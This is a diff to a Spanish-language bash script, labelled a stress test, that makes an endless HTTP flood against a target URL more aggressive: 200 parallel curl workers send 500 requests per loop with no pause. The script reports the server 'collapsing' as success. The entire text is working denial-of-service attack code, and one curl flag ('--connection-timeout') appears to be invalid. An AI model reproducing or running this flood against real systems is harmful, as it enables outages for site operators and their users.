@@ -14,19 +14,21 @@ echo "Target: $TARGET_URL"
 echo "Fecha: $(date)"
 echo "-------------------------------------------------"
 
-# 1. Prueba de estrés real (Inundación Continua)
-echo "[+] Iniciando inundación continua..."
-echo "[!] ADVERTENCIA: Esta prueba se ejecutará HASTA QUE LA DETENGAS."
+# 1. Prueba de estrés real (Inundación Ultra-Agresiva)
+echo "[+] Iniciando inundación masiva (Extreme HTTP Flood)..."
+echo "[!] ADVERTENCIA: Esta prueba enviará miles de peticiones por segundo."
 echo "[!] Presiona Ctrl+C en la terminal para detener el ataque."
 
-# Inundación infinita usando un bucle while
+# Inundación infinita con hilos mucho más pesados y sin esperas
 while true; do
-    seq 100 | xargs -n 1 -P 50 curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
+    # -P 200: 200 hilos simultáneos
+    # --connection-timeout 2: No perder tiempo con conexiones lentas
+    seq 500 | xargs -n 1 -P 200 curl -s -L --connection-timeout 2 -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
     
     # Análisis rápido de salud del servidor
-    FAIL_COUNT=$(tail -n 100 /tmp/stress_results.txt | grep -c -v "200")
-    if [ "$FAIL_COUNT" -gt 80 ]; then
-        echo "[!] ALERTA CRÍTICA: El servidor ha dejado de responder (DoS detectado)."
+    FAIL_COUNT=$(tail -n 200 /tmp/stress_results.txt | grep -c -v "200")
+    if [ "$FAIL_COUNT" -gt 150 ]; then
+        echo "[!!!] ÉXITO: El servidor está colapsando o bloqueando el tráfico masivo."
     fi
 done &
 STRESS_PID=$!
